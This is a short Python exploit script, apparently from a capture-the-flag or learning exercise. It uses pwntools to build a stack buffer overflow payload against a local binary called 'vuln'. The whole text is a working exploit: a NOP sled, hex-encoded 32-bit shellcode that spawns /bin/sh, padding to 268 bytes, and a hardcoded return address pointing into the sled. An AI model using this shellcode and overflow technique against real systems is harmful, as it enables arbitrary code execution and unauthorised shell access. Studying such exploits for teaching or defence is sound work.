# gdb vuln
## r $(python exploit2.py)

## NOW INSERT shellcode INSIDE NOPs 
from pwn import *
#padding = cyclic(300)
#padding = cyclic(cyclic_find('raac'))
#print(cyclic(300).find('raac'))

padding = "\x90"*100


shellcode = "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46" \
            "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1" \
            "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41" \
            "\x4b\x4b\x4b\x4b"

# DIRECCION DEL INICIO BUFFER + 50 Bytes, para que caiga en NOPs
eip = p32(0xffffce30+0x40) # eip --> 0xffffce70
eip = p32(0xffffce30+50)   # eip --> 0xffffce62

add = "\x90"*(268-len(shellcode)-len(padding))

payload = padding + shellcode + add + eip 

print(payload)
